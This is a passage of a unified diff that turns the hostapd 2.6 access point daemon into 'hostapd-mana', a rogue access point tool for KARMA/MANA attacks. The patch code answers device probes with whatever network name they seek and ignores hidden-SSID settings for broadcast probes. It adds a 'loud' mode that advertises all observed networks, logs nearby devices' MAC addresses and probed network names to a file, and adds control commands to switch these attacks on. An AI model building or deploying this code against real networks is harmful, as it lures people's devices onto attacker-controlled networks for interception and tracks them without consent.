@@ -1,0 +1,1549 @@
+diff -ur hostapd-2.6/hostapd/config_file.c hostapd-2.6-mana/hostapd/config_file.c
+--- hostapd-2.6/hostapd/config_file.c	2016-10-02 20:51:11.000000000 +0200
++++ hostapd-2.6-mana/hostapd/config_file.c	2016-12-12 23:38:37.000000000 +0200
+@@ -21,6 +21,8 @@
+ #include "ap/ap_config.h"
+ #include "config_file.h"
+ 
++#include <stdlib.h>
++
+ 
+ #ifndef CONFIG_NO_RADIUS
+ #ifdef EAP_SERVER
+@@ -118,16 +120,18 @@
+ 	return os_memcmp(aa->addr, bb->addr, sizeof(macaddr));
+ }
+ 
+-
+ static int hostapd_config_read_maclist(const char *fname,
+ 				       struct mac_acl_entry **acl, int *num)
+ {
+ 	FILE *f;
+ 	char buf[128], *pos;
++	char *lastpos; //MANA
+ 	int line = 0;
+ 	u8 addr[ETH_ALEN];
++	u8 mask[ETH_ALEN], transform[ETH_ALEN]; //MANA
+ 	struct mac_acl_entry *newacl;
+ 	int vlan_id;
++	int vlanflag = 0; //MANA
+ 
+ 	if (!fname)
+ 		return 0;
+@@ -155,6 +159,7 @@
+ 		}
+ 		if (buf[0] == '\0')
+ 			continue;
++		lastpos = pos; //MANA
+ 		pos = buf;
+ 		if (buf[0] == '-') {
+ 			rem = 1;
+@@ -187,8 +192,45 @@
+ 			pos++;
+ 		while (*pos == ' ' || *pos == '\t')
+ 			pos++;
+-		if (*pos != '\0')
+-			vlan_id = atoi(pos);
++		if (*pos != '\0') {
++			if (*(pos+2) != ':') { //MANA
++				vlan_id = atoi(pos);
++				vlanflag = 1;
++			}
++		}
++
++		//MANA Start - parse MAC mask
++		lastpos = pos;
++		while (*pos != '\0') {
++			if (*pos == '\n') {
++				*pos = '\0';
++				break;
++			}
++			pos++;
++		}
++		pos = lastpos;
++
++		if (vlanflag) {
++			while (*pos != '\0' && *pos != ' ' && *pos != '\t')
++				pos++;
++			while (*pos == ' ' || *pos == '\t')
++				pos++;
++		}
++
++		if (*pos != '\0') {
++			if (hwaddr_aton(pos, mask)) {
++				wpa_printf(MSG_ERROR, "Invalid MAC mask '%s' at "
++					   "line %d in '%s'", pos, line, fname);
++				fclose(f);
++				return -1;
++			}
++			int i;
++			for (i=0; i<ETH_ALEN; i++) {
++				transform[i] = addr[i] & mask[i]; //We need to store it transformed for the binary search used in hostapd_maclist_found to get a properly sorted list
++			}
++		} else 
++			hwaddr_aton("ff:ff:ff:ff:ff:ff", mask); //No mask specified to add a "no change" mask
++		//MANA End
+ 
+ 		newacl = os_realloc_array(*acl, *num + 1, sizeof(**acl));
+ 		if (newacl == NULL) {
+@@ -198,7 +240,9 @@
+ 		}
+ 
+ 		*acl = newacl;
+-		os_memcpy((*acl)[*num].addr, addr, ETH_ALEN);
++		//os_memcpy((*acl)[*num].addr, addr, ETH_ALEN);
++		os_memcpy((*acl)[*num].addr, transform, ETH_ALEN); //MANA
++		os_memcpy((*acl)[*num].mask, mask, ETH_ALEN); //MANA
+ 		os_memset(&(*acl)[*num].vlan_id, 0,
+ 			  sizeof((*acl)[*num].vlan_id));
+ 		(*acl)[*num].vlan_id.untagged = vlan_id;
+@@ -2029,6 +2073,26 @@
+ 		bss->logger_syslog = atoi(pos);
+ 	} else if (os_strcmp(buf, "logger_stdout") == 0) {
+ 		bss->logger_stdout = atoi(pos);
++	// MANA START
++	} else if (os_strcmp(buf, "enable_mana") == 0) {
++		int val = atoi(pos);
++		conf->enable_mana = (val != 0);
++		if (conf->enable_mana) {
++			wpa_printf(MSG_DEBUG, "MANA: Enabled");
++		}
++	} else if (os_strcmp(buf, "mana_loud") == 0) {
++		int val = atoi(pos);
++		conf->mana_loud = (val != 0);
++		if (conf->mana_loud) {
++			wpa_printf(MSG_DEBUG, "MANA: Loud mode enabled");
++		}
++	} else if (os_strcmp(buf, "mana_macacl") == 0) {
++		int val = atoi(pos);
++		conf->mana_macacl = (val != 0);
++		if (conf->mana_macacl) {
++			wpa_printf(MSG_DEBUG, "MANA: MAC ACLs extended to management frames");
++		}
++	// MANA END
+ 	} else if (os_strcmp(buf, "dump_file") == 0) {
+ 		wpa_printf(MSG_INFO, "Line %d: DEPRECATED: 'dump_file' configuration variable is not used anymore",
+ 			   line);
+@@ -3491,6 +3555,10 @@
+ 		bss->ftm_responder = atoi(pos);
+ 	} else if (os_strcmp(buf, "ftm_initiator") == 0) {
+ 		bss->ftm_initiator = atoi(pos);
++	} else if (os_strcmp(buf, "ennode") == 0) { //MANA
++		setenv("MANANODE", pos, 1);
++	} else if (os_strcmp(buf, "mana_outfile") == 0) { //MANA
++		setenv("MANAOUTFILE", pos, 1);
+ 	} else {
+ 		wpa_printf(MSG_ERROR,
+ 			   "Line %d: unknown configuration item '%s'",
+@@ -3540,6 +3608,12 @@
+ 
+ 	conf->last_bss = conf->bss[0];
+ 
++	// MANA START
++	conf->enable_mana = 0; //default off;
++	conf->mana_loud = 0; //default off; 1 - advertise all networks across all devices, 0 - advertise specific networks to the device it was discovered from
++	conf->mana_macacl = 0; //default off; 0 - off, 1 - extend MAC ACL to management frames
++	// MANA END
++
+ 	while (fgets(buf, sizeof(buf), f)) {
+ 		struct hostapd_bss_config *bss;
+ 
+diff -ur hostapd-2.6/hostapd/ctrl_iface.c hostapd-2.6-mana/hostapd/ctrl_iface.c
+--- hostapd-2.6/hostapd/ctrl_iface.c	2016-10-02 20:51:11.000000000 +0200
++++ hostapd-2.6-mana/hostapd/ctrl_iface.c	2016-12-13 01:24:37.000000000 +0200
+@@ -56,7 +56,6 @@
+ #include "config_file.h"
+ #include "ctrl_iface.h"
+ 
+-
+ #define HOSTAPD_CLI_DUP_VALUE_MAX_LEN 256
+ 
+ #ifdef CONFIG_CTRL_IFACE_UDP
+@@ -124,6 +123,79 @@
+ 	return 0;
+ }
+ 
++// MANA START
++
++static int hostapd_ctrl_iface_mana_get_state (struct hostapd_data *hapd)
++{
++	wpa_printf(MSG_DEBUG, "MANA CTRL_IFACE STATUS QUERY");
++	return hapd->iconf->enable_mana;
++}
++
++static int hostapd_ctrl_iface_mana_get_mode (struct hostapd_data *hapd)
++{
++	wpa_printf(MSG_DEBUG, "MANA CTRL_IFACE LOUD MODE STATUS QUERY");
++	return hapd->iconf->mana_loud;
++}
++
++static int hostapd_ctrl_iface_mana_get_aclmode (struct hostapd_data *hapd)
++{
++	wpa_printf(MSG_DEBUG, "MANA CTRL_IFACE MAC ACL STATUS QUERY");
++	return hapd->iconf->mana_macacl;
++}
++
++static int hostapd_ctrl_iface_mana_change_ssid (struct hostapd_data *hapd,
++					     const char *ssid) {
++	wpa_printf(MSG_DEBUG, "MANA CTRL_IFACE CHANGE SSID %s", ssid);
++
++	if (strlen(ssid) > SSID_MAX_LEN || strlen(ssid) == 0) {
++		return -1;
++	}
++
++	hapd->conf->ssid.ssid_len = strlen(ssid);
++	// Not sure if the +1 is needed here or not
++	os_memcpy(hapd->conf->ssid.ssid, ssid, strlen(ssid) + 1);
++	ieee802_11_set_beacon(hapd);
++	wpa_printf(MSG_DEBUG, "CTRL_IFACE MANA Default SSID Changed");
++	return 0;
++}
++
++static int hostapd_ctrl_iface_mana_enable_disable (struct hostapd_data *hapd, int status)
++{
++	if (status) {
++		wpa_printf(MSG_DEBUG, "MANA CTRL_IFACE ENABLED");
++	} else {
++		wpa_printf(MSG_DEBUG, "MANA CTRL_IFACE DISABLED");
++	}
++	hapd->iconf->enable_mana = status;
++
++	return 0;
++}
++
++static int hostapd_ctrl_iface_mana_loud_enable_disable (struct hostapd_data *hapd, int status)
++{
++	if (status) {
++		wpa_printf(MSG_DEBUG, "MANA CTRL_IFACE LOUD MODE ENABLED");
++	} else {
++		wpa_printf(MSG_DEBUG, "MANA CTRL_IFACE LOUD MODE DISABLED");
++	}
++	hapd->iconf->mana_loud = status;
++
++	return 0;
++}
++
++static int hostapd_ctrl_iface_mana_macacl_enable_disable (struct hostapd_data *hapd, int status)
++{
++	if (status) {
++		wpa_printf(MSG_DEBUG, "MANA CTRL_IFACE MACACL MODE ENABLED");
++	} else {
++		wpa_printf(MSG_DEBUG, "MANA CTRL_IFACE MACACL MODE DISABLED");
++	}
++	hapd->iconf->mana_macacl = status;
++
++	return 0;
++}
++
++// MANA END
+ 
+ #ifdef CONFIG_IEEE80211W
+ #ifdef NEED_AP_MLME
+@@ -221,7 +293,6 @@
+ 	return ret;
+ }
+ 
+-
+ #ifdef CONFIG_WPS_NFC
+ static int hostapd_ctrl_iface_wps_nfc_tag_read(struct hostapd_data *hapd,
+ 					       char *pos)
+@@ -2549,6 +2620,66 @@
+ 	} else if (os_strcmp(buf, "DRIVER_FLAGS") == 0) {
+ 		reply_len = hostapd_ctrl_driver_flags(hapd->iface, reply,
+ 						      reply_size);
++ 	// MANA
++ 	} else if (os_strcmp(buf, "MANA_STATE") == 0) {
++ 		if (hostapd_ctrl_iface_mana_get_state(hapd)) {
++ 			os_memcpy(reply, "MANA ENABLED\n", 14);
++ 			reply_len = 14;
++ 		} else {
++ 			os_memcpy(reply, "MANA DISABLED\n", 15);
++ 			reply_len = 15;
++ 		}
++ 	} else if (os_strcmp(buf, "MANA_MODE") == 0) {
++ 		if (hostapd_ctrl_iface_mana_get_mode(hapd)) {
++ 			os_memcpy(reply, "MANA LOUD MODE ENABLED\n", 23);
++ 			reply_len = 23;
++ 		} else {
++ 			os_memcpy(reply, "MANA LOUD MODE DISABLED\n", 24);
++ 			reply_len = 24;
++ 		}
++ 	} else if (os_strcmp(buf, "MANA_ACLMODE") == 0) {
++ 		if (hostapd_ctrl_iface_mana_get_aclmode(hapd)) {
++ 			os_memcpy(reply, "MANA ACL MODE ENABLED\n", 22);
++ 			reply_len = 22;
++ 		} else {
++ 			os_memcpy(reply, "MAN ACL MODE DISABLED\n", 22);
++ 			reply_len = 22;
++ 		}
++ 	} else if (os_strcmp(buf, "MANA_GET_SSID") == 0) {
++ 		wpa_printf(MSG_DEBUG, "MANA CTRL_IFACE GET SSID");
++ 		size_t len;
++  
++ 		// +2 for the new line and the null byte terminator
++ 		len = hapd->conf->ssid.ssid_len + 2;
++ 		os_snprintf(reply, len, "%s\n", hapd->conf->ssid.ssid);
++ 		reply_len = len;
++  
++ 	} else if (os_strncmp(buf, "MANA_CHANGE_SSID ", 18) == 0) {
++ 		if (hostapd_ctrl_iface_mana_change_ssid (hapd, buf + 18)) {
++ 			reply_len = -1;
++ 		} else {
++ 			os_memcpy(reply, "CHANGED\n", 8);
++ 			reply_len = 8;
++ 		}
++ 	} else if (os_strcmp(buf, "MANA_DISABLE") == 0) {
++ 		if (hostapd_ctrl_iface_mana_enable_disable(hapd, 0))
++ 			reply_len = -1;
++ 	} else if (os_strcmp(buf, "MANA_ENABLE") == 0) {
++ 		if (hostapd_ctrl_iface_mana_enable_disable(hapd, 1))
++ 			reply_len = -1;
++ 	} else if (os_strcmp(buf, "LOUD_ENABLE") == 0) {
++ 		if (hostapd_ctrl_iface_mana_loud_enable_disable(hapd, 1))
++ 			reply_len = -1;
++ 	} else if (os_strcmp(buf, "LOUD_DISABLE") == 0) {
++ 		if (hostapd_ctrl_iface_mana_loud_enable_disable(hapd, 0))
++ 			reply_len = -1;
++ 	} else if (os_strcmp(buf, "MANAACL_ENABLE") == 0) {
++ 		if (hostapd_ctrl_iface_mana_macacl_enable_disable(hapd, 1))
++ 			reply_len = -1;
++ 	} else if (os_strcmp(buf, "MANAACL_DISABLE") == 0) {
++ 		if (hostapd_ctrl_iface_mana_macacl_enable_disable(hapd, 0))
++ 			reply_len = -1;
++ 	// END MANA
+ 	} else {
+ 		os_memcpy(reply, "UNKNOWN COMMAND\n", 16);
+ 		reply_len = 16;
+diff -ur hostapd-2.6/hostapd/defconfig hostapd-2.6-mana/hostapd/defconfig
+--- hostapd-2.6/hostapd/defconfig	2016-10-02 20:51:11.000000000 +0200
++++ hostapd-2.6-mana/hostapd/defconfig	2016-12-13 00:33:01.000000000 +0200
+@@ -111,7 +111,7 @@
+ # Note: If OpenSSL is used as the TLS library, OpenSSL 1.0 or newer is needed
+ # for EAP-FAST support. Older OpenSSL releases would need to be patched, e.g.,
+ # with openssl-0.9.8x-tls-extensions.patch, to add the needed functions.
+-#CONFIG_EAP_FAST=y
++CONFIG_EAP_FAST=y
+ 
+ # Wi-Fi Protected Setup (WPS)
+ #CONFIG_WPS=y
+diff -ur hostapd-2.6/hostapd/hostapd.accept hostapd-2.6-mana/hostapd/hostapd.accept
+--- hostapd-2.6/hostapd/hostapd.accept	2016-10-02 20:51:11.000000000 +0200
++++ hostapd-2.6-mana/hostapd/hostapd.accept	2016-12-12 23:32:02.000000000 +0200
+@@ -1,6 +1,19 @@
+ # List of MAC addresses that are allowed to authenticate (IEEE 802.11)
+ # with the AP. Optional VLAN ID can be assigned for clients based on the
+ # MAC address if dynamic VLANs (hostapd.conf dynamic_vlan option) are used.
++# A MAC mask can be used to specify a range of MAC addresses. However
++# this is only useful with mana_macacl and ignored by normal macaddr_acl
++# behaviour.
++# For example:
++# 00:11:22:33:44:55		00:ff:00:ff:00:ff
++# will be similar to saying allow all MAC addresses that match: *:11:*:33:*:55
++# Locally administered MACs (i.e. the random MACs) used by some device to probe
++# for networks are handled by the below MAC and mask. It's essentially checking
++# for the second bit having been set in the MAC i.e. ??????1?:*:*:*:*:*
++02:00:00:00:00:00 	02:00:00:00:00:00
++
+ 00:11:22:33:44:55
+ 00:66:77:88:99:aa
+ 00:00:22:33:44:55	1
++00:44:33:dd:aa:33	00:00:00:00:00:00
++00:aa:bb:ee:00:00	100 ff:00:00:00:ff:ff
+diff -ur hostapd-2.6/hostapd/hostapd.conf hostapd-2.6-mana/hostapd/hostapd.conf
+--- hostapd-2.6/hostapd/hostapd.conf	2016-10-02 20:51:11.000000000 +0200
++++ hostapd-2.6-mana/hostapd/hostapd.conf	2016-12-12 23:32:02.000000000 +0200
+@@ -1,3 +1,31 @@
++##### MANA specific configurations ############################################
++# MANA attacks include KARMA attacks as well as responding to broadcast probes.
++# Enabling this will attempt to attract devices probing for "other" networks.
++# If you want a "standard AP" that only looks like one network, don't enable this.
++# 0 = disabled - don't perform MANA attacks
++# 1 = enabled - perform MANA attacks 
++enable_mana=1
++
++# By default, MANA will be a little stealthy and only advertise probed for networks
++# directly to the device that probed for it.
++# However, not all devices probe as much as they used to, and some devices will
++# probe with "random" locally administered MAC addresses.
++# Loud mode will re-broadcast all networks to all devices.
++# 0 = disabled - networks are broadcast at the specific devices looking for them
++# 1 = enabled - networks are advertised to all devices
++mana_loud=0
++
++# Normal access points MAC ACLs will only work at association level. This option
++# will expand MAC ACLs to probe responses. 
++# It requires macaddr_acl to be set later in the config file to work. This controls
++# whether we're operating in black or white list mode. The MACs are defined in the
++# files listed in accept_mac_file and deny_mac_file.
++# Setting ignore_broadcast_ssid below will also hide the base network from
++# non-authorised devices.
++# 0 = disabled - MAC ACLs are not applied to probe response frames (default)
++# 1 = enabled - MAC ACLs will be extended to probe response frames
++mana_macacl=0
++
+ ##### hostapd configuration file ##############################################
+ # Empty lines and lines starting with # are ignored
+ 
+@@ -269,6 +297,10 @@
+ # 2 = clear SSID (ASCII 0), but keep the original length (this may be required
+ #     with some clients that do not support empty SSID) and ignore probe
+ #     requests for broadcast SSID
++# NB If enable_mana is set above, this option will not prevent hostapd from
++# responding to broadcast probe requests, but will remove the ESSID from the
++# beacons. If set in conjunction with mana_macacl (see above) it will effectively
++# hide the network from "denied" MAC addresses.
+ ignore_broadcast_ssid=0
+ 
+ # Do not reply to broadcast Probe Request frames from unassociated STA if there
+@@ -436,18 +468,18 @@
+ # disassociation frame is not sent immediately without first polling
+ # the STA with a data frame.
+ # default: 300 (i.e., 5 minutes)
+-#ap_max_inactivity=300
++ap_max_inactivity=3000
+ #
+ # The inactivity polling can be disabled to disconnect stations based on
+ # inactivity timeout so that idle stations are more likely to be disconnected
+ # even if they are still in range of the AP. This can be done by setting
+ # skip_inactivity_poll to 1 (default 0).
+-#skip_inactivity_poll=0
++skip_inactivity_poll=0
+ 
+ # Disassociate stations based on excessive transmission failures or other
+ # indications of connection loss. This depends on the driver capabilities and
+ # may not be available with all drivers.
+-#disassoc_low_ack=1
++disassoc_low_ack=0
+ 
+ # Maximum allowed Listen Interval (how many Beacon periods STAs are allowed to
+ # remain asleep). Default: 65535 (no limit apart from field size)
+@@ -1986,8 +2018,9 @@
+ # as the defaults for the following BSSes. However, it is recommended that all
+ # BSSes include explicit configuration of all relevant configuration items.
+ #
+-#bss=wlan0_0
++#bss=wlan1
+ #ssid=test2
++#bssid=02:21:91:01:11:31
+ # most of the above items can be used here (apart from radio interface specific
+ # items, like channel)
+ 
+diff -ur hostapd-2.6/hostapd/hostapd_cli.c hostapd-2.6-mana/hostapd/hostapd_cli.c
+--- hostapd-2.6/hostapd/hostapd_cli.c	2016-10-02 20:51:11.000000000 +0200
++++ hostapd-2.6-mana/hostapd/hostapd_cli.c	2016-12-13 01:25:56.000000000 +0200
+@@ -16,6 +16,7 @@
+ #include "utils/edit.h"
+ #include "common/version.h"
+ #include "common/cli.h"
++#include "ap/ap_config.h" //MANA
+ 
+ #ifndef CONFIG_NO_CTRL_IFACE
+ 
+@@ -332,6 +333,70 @@
+ 	return res;
+ }
+ 
++// MANA START
++static int hostapd_cli_cmd_mana_change_ssid(struct wpa_ctrl *ctrl, int argc,
++					char *argv[])
++{
++	// Max length of SSID is 32 chars + the command and the null byte
++	char buf[50];
++	if (argc < 1) {
++		printf("Invalid 'change Mana SSID' command - exactly one "
++		       "argument, SSID, is required.\n");
++		return -1;
++	}
++	if (strlen(argv[0]) > SSID_MAX_LEN) {
++		printf("The max length of an SSID is %i\n", SSID_MAX_LEN);
++		return -1;
++	}
++	os_snprintf(buf, sizeof(buf), "MANA_CHANGE_SSID %s", argv[0]);
++	return wpa_ctrl_command(ctrl, buf);
++}
++
++static int hostapd_cli_cmd_mana_get_ssid(struct wpa_ctrl *ctrl, int argc,
++					char *argv[])
++{
++	return wpa_ctrl_command(ctrl, "MANA_GET_SSID");
++}
++
++// These should be one function with a parameter
++static int hostapd_cli_cmd_mana_disable(struct wpa_ctrl *ctrl, int argc, char *argv[])
++{
++	return wpa_ctrl_command(ctrl, "MANA_DISABLE");
++}
++static int hostapd_cli_cmd_mana_enable(struct wpa_ctrl *ctrl, int argc, char *argv[])
++{
++	return wpa_ctrl_command(ctrl, "MANA_ENABLE");
++}
++static int hostapd_cli_cmd_mana_get_state(struct wpa_ctrl *ctrl, int argc, char *argv[])
++{
++	return wpa_ctrl_command(ctrl, "MANA_STATE");
++}
++static int hostapd_cli_cmd_mana_loud_disable(struct wpa_ctrl *ctrl, int argc, char *argv[])
++{
++	return wpa_ctrl_command(ctrl, "LOUD_DISABLE");
++}
++static int hostapd_cli_cmd_mana_loud_enable(struct wpa_ctrl *ctrl, int argc, char *argv[])
++{
++	return wpa_ctrl_command(ctrl, "LOUD_ENABLE");
++}
++static int hostapd_cli_cmd_mana_get_mode(struct wpa_ctrl *ctrl, int argc, char *argv[])
++{
++	return wpa_ctrl_command(ctrl, "MANA_MODE");
++}
++static int hostapd_cli_cmd_mana_macacl_disable(struct wpa_ctrl *ctrl, int argc, char *argv[])
++{
++	return wpa_ctrl_command(ctrl, "MANAACL_DISABLE");
++}
++static int hostapd_cli_cmd_mana_macacl_enable(struct wpa_ctrl *ctrl, int argc, char *argv[])
++{
++	return wpa_ctrl_command(ctrl, "MANAACL_ENABLE");
++}
++static int hostapd_cli_cmd_mana_get_aclmode(struct wpa_ctrl *ctrl, int argc, char *argv[])
++{
++	return wpa_ctrl_command(ctrl, "MANA_ACLMODE");
++}
++// END MANA
++
+ 
+ static int hostapd_cli_cmd_disassociate(struct wpa_ctrl *ctrl, int argc,
+ 					char *argv[])
+@@ -1360,6 +1425,21 @@
+ 	{ "req_lci", hostapd_cli_cmd_req_lci, NULL, NULL },
+ 	{ "req_range", hostapd_cli_cmd_req_range, NULL, NULL },
+ 	{ "driver_flags", hostapd_cli_cmd_driver_flags, NULL, NULL },
++ // MANA START
++ 	{ "?", hostapd_cli_cmd_help, NULL, NULL }, //One of digininja's original changes :)
++ 	{ "mana_change_ssid", hostapd_cli_cmd_mana_change_ssid, NULL, "= change the default SSID for when mana is off" },
++ 	{ "mana_get_ssid", hostapd_cli_cmd_mana_get_ssid, NULL, "= get the default SSID for when mana is off" },
++ 	{ "mana_get_state", hostapd_cli_cmd_mana_get_state, NULL, "= get the state of mana" },
++ 	{ "mana_disable", hostapd_cli_cmd_mana_disable, NULL, "= disable mana" },
++ 	{ "mana_enable", hostapd_cli_cmd_mana_enable, NULL, "= enable mana" },
++ 	{ "mana_loud_off", hostapd_cli_cmd_mana_loud_disable, NULL, "= disable mana's loud mode" },
++ 	{ "mana_loud_on", hostapd_cli_cmd_mana_loud_enable, NULL, "= enable mana's loud mode" },
++ 	{ "mana_loud_state", hostapd_cli_cmd_mana_get_mode, NULL, "= check mana's loud mode" },
++ 	{ "mana_macacl_off", hostapd_cli_cmd_mana_macacl_disable, NULL, "= disable MAC ACLs at management frame level" },
++ 	{ "mana_macacl_on", hostapd_cli_cmd_mana_macacl_enable, NULL, "= enable MAC ACLs at management frame level" },
++ 	{ "mana_macacl_state", hostapd_cli_cmd_mana_get_aclmode, NULL, "= check mana's MAC ACL mode" },
++ // END MANA
++
+ 	{ NULL, NULL, NULL, NULL }
+ };
+ 
+diff -ur hostapd-2.6/hostapd/main.c hostapd-2.6-mana/hostapd/main.c
+--- hostapd-2.6/hostapd/main.c	2016-10-02 20:51:11.000000000 +0200
++++ hostapd-2.6-mana/hostapd/main.c	2016-12-12 23:50:52.000000000 +0200
+@@ -448,11 +448,18 @@
+ static void show_version(void)
+ {
+ 	fprintf(stderr,
+-		"hostapd v" VERSION_STR "\n"
++		"hostapd-mana v" VERSION_STR "\n"
+ 		"User space daemon for IEEE 802.11 AP management,\n"
+ 		"IEEE 802.1X/WPA/WPA2/EAP/RADIUS Authenticator\n"
+ 		"Copyright (c) 2002-2016, Jouni Malinen <j@w1.fi> "
+-		"and contributors\n");
++		//"and contributors\n");
++ 		"and contributors\n"
++ 		"--------------------------------------------------\n"
++ 		"MANA (ManInTheMiddle And Network Attack)\n"
++ 		"See https://github.com/sensepost/hostapd-mana for more\n"
++ 		"By singe (dominic@sensepost.com) & ian (ian@sensepost.com)\n"
++ 		"Original karma patches by Robin Wood - robin@digininja.org\n"
++ 		"Original EAP patches by Brad Antoniewicz @brad_anton\n");
+ }
+ 
+ 
+diff -ur hostapd-2.6/src/ap/ap_config.c hostapd-2.6-mana/src/ap/ap_config.c
+--- hostapd-2.6/src/ap/ap_config.c	2016-10-02 20:51:11.000000000 +0200
++++ hostapd-2.6-mana/src/ap/ap_config.c	2016-12-12 23:32:02.000000000 +0200
+@@ -628,18 +628,32 @@
+ 			  const u8 *addr, struct vlan_description *vlan_id)
+ {
+ 	int start, end, middle, res;
++	u8 mac1[ETH_ALEN], mac2[ETH_ALEN]; //MANA
++	int i; //MANA
+ 
+ 	start = 0;
+ 	end = num_entries - 1;
+ 
+ 	while (start <= end) {
+ 		middle = (start + end) / 2;
+-		res = os_memcmp(list[middle].addr, addr, ETH_ALEN);
++		//MANA start - apply MAC mask
++		for (i=0; i<ETH_ALEN; i++) {
++			mac1[i] = list[middle].addr[i]; //This is already transformed on load
++			mac2[i] = addr[i] & list[middle].mask[i];
++		}
++		wpa_printf(MSG_DEBUG, "MANA: Comparing " MACSTR "/"MACSTR " against " MACSTR " transformed to " MACSTR,MAC2STR(mac1), MAC2STR(list[middle].mask), MAC2STR(addr), MAC2STR(mac2));
++		res = os_memcmp(mac1, mac2, ETH_ALEN);
++		//MANA end
++		//res = os_memcmp(list[middle].addr, addr, ETH_ALEN);
+ 		if (res == 0) {
+ 			if (vlan_id)
+ 				*vlan_id = list[middle].vlan_id;
+ 			return 1;
+ 		}
++		//MANA start
++		if (res != 0)
++			res = os_memcmp(mac1, addr, ETH_ALEN); //binary search requires a constant value, transformed value is changing each time
++		//MANA end
+ 		if (res < 0)
+ 			start = middle + 1;
+ 		else
+diff -ur hostapd-2.6/src/ap/ap_config.h hostapd-2.6-mana/src/ap/ap_config.h
+--- hostapd-2.6/src/ap/ap_config.h	2016-10-02 20:51:11.000000000 +0200
++++ hostapd-2.6-mana/src/ap/ap_config.h	2016-12-12 23:52:05.000000000 +0200
+@@ -58,6 +58,7 @@
+ 
+ struct mac_acl_entry {
+ 	macaddr addr;
++	macaddr mask; //MANA
+ 	struct vlan_description vlan_id;
+ };
+ 
+@@ -605,6 +606,12 @@
+ 	struct hostapd_bss_config **bss, *last_bss;
+ 	size_t num_bss;
+ 
++	// MANA
++	int enable_mana;
++	int mana_loud;
++	int mana_macacl;
++	// MANA END
++
+ 	u16 beacon_int;
+ 	int rts_threshold;
+ 	int fragm_threshold;
+diff -ur hostapd-2.6/src/ap/beacon.c hostapd-2.6-mana/src/ap/beacon.c
+--- hostapd-2.6/src/ap/beacon.c	2016-10-02 20:51:11.000000000 +0200
++++ hostapd-2.6-mana/src/ap/beacon.c	2016-12-13 01:21:58.000000000 +0200
+@@ -31,6 +31,10 @@
+ #include "dfs.h"
+ #include "taxonomy.h"
+ 
++// MANA START
++struct mana_mac *mana_machash = NULL;
++struct mana_ssid *mana_ssidhash = NULL;
++// MANA END
+ 
+ #ifdef NEED_AP_MLME
+ 
+@@ -81,6 +85,21 @@
+ 	return eid;
+ }
+ 
++//Start MANA
++static void log_ssid(const u8 *ssid, size_t ssid_len, const u8 *mac) {
++	//Quick hack to output observed MACs & SSIDs
++	//TODO: Fix this so it works in loud mode, right now will only log an SSID once
++	char *mana_outfile = getenv("MANAOUTFILE");
++	FILE *f = fopen(mana_outfile, "a");
++	if (f != NULL) {
++		int rand=0;
++		if (mac[0] & 2) //Check if locally administered aka random MAC
++			rand=1;	
++		fprintf(f,MACSTR ", %s, %d\n", MAC2STR(mac), wpa_ssid_txt(ssid, ssid_len), rand);
++		fclose(f);
++	}
++}
++//End MANA
+ 
+ static u8 ieee802_11_erp_info(struct hostapd_data *hapd)
+ {
+@@ -364,6 +383,7 @@
+ 
+ 
+ static u8 * hostapd_gen_probe_resp(struct hostapd_data *hapd,
++				   const u8 *ssid, size_t ssid_len, //MANA
+ 				   const struct ieee80211_mgmt *req,
+ 				   int is_p2p, size_t *resp_len)
+ {
+@@ -402,6 +422,25 @@
+ 
+ 	resp->frame_control = IEEE80211_FC(WLAN_FC_TYPE_MGMT,
+ 					   WLAN_FC_STYPE_PROBE_RESP);
++
++	//MANA - check against macacl
++	if (req && hapd->iconf->mana_macacl) {
++		int match;
++		if (hapd->iconf->bss[0]->macaddr_acl == DENY_UNLESS_ACCEPTED) {
++			match = hostapd_maclist_found(hapd->conf->accept_mac, hapd->conf->num_accept_mac, req->sa, NULL);
++			if (!match) {
++				wpa_printf(MSG_DEBUG, "MANA: Station MAC is not authorised by accept ACL: " MACSTR, MAC2STR(req->sa));
++				return NULL; //MAC is not in accept list, back out and don't send
++			}
++		} else if (hapd->iconf->bss[0]->macaddr_acl == ACCEPT_UNLESS_DENIED) {
++			if (hostapd_maclist_found(hapd->conf->deny_mac, hapd->conf->num_deny_mac, req->sa, NULL)) {
++				wpa_printf(MSG_DEBUG, "MANA: Station MAC is not authorised by deny ACL: " MACSTR, MAC2STR(req->sa));
++				return NULL; //MAC is in deny list, back out and don't send
++			}
++		}
++		wpa_printf(MSG_INFO, "MANA: Station MAC is authorised by ACL: " MACSTR, MAC2STR(req->sa));
++	}
++    //MANA END
+ 	if (req)
+ 		os_memcpy(resp->da, req->sa, ETH_ALEN);
+ 	os_memcpy(resp->sa, hapd->own_addr, ETH_ALEN);
+@@ -412,19 +451,30 @@
+ 
+ 	/* hardware or low-level driver will setup seq_ctrl and timestamp */
+ 	resp->u.probe_resp.capab_info =
+-		host_to_le16(hostapd_own_capab_info(hapd));
++		host_to_le16(hostapd_own_capab_info(hapd)); //MANA - FOLLOW
+ 
+ 	pos = resp->u.probe_resp.variable;
+ 	*pos++ = WLAN_EID_SSID;
+-	*pos++ = hapd->conf->ssid.ssid_len;
+-	os_memcpy(pos, hapd->conf->ssid.ssid, hapd->conf->ssid.ssid_len);
+-	pos += hapd->conf->ssid.ssid_len;
++	//*pos++ = hapd->conf->ssid.ssid_len;
++	//os_memcpy(pos, hapd->conf->ssid.ssid, hapd->conf->ssid.ssid_len);
++	//pos += hapd->conf->ssid.ssid_len;
++ 	// MANA START
++ 	if (hapd->iconf->enable_mana && ssid_len > 0) {
++ 		*pos++ = ssid_len;
++ 		os_memcpy(pos, ssid, ssid_len);
++ 		pos += ssid_len;
++ 	} else {
++ 		*pos++ = hapd->conf->ssid.ssid_len;
++ 		os_memcpy(pos, hapd->conf->ssid.ssid, hapd->conf->ssid.ssid_len);
++ 		pos += hapd->conf->ssid.ssid_len;
++ 	}
++ 	// MANA END
+ 
+ 	/* Supported rates */
+ 	pos = hostapd_eid_supp_rates(hapd, pos);
+ 
+ 	/* DS Params */
+-	pos = hostapd_eid_ds_params(hapd, pos);
++	pos = hostapd_eid_ds_params(hapd, pos); //MANA
+ 
+ 	pos = hostapd_eid_country(hapd, pos, epos - pos);
+ 
+@@ -707,6 +757,7 @@
+ 	int ret;
+ 	u16 csa_offs[2];
+ 	size_t csa_offs_len;
++	int iterate = 0; //MANA
+ 
+ 	if (len < IEEE80211_HDRLEN)
+ 		return;
+@@ -786,7 +837,7 @@
+ #endif /* CONFIG_P2P */
+ 
+ 	if (hapd->conf->ignore_broadcast_ssid && elems.ssid_len == 0 &&
+-	    elems.ssid_list_len == 0) {
++	    elems.ssid_list_len == 0 && !hapd->iconf->enable_mana) { //MANA
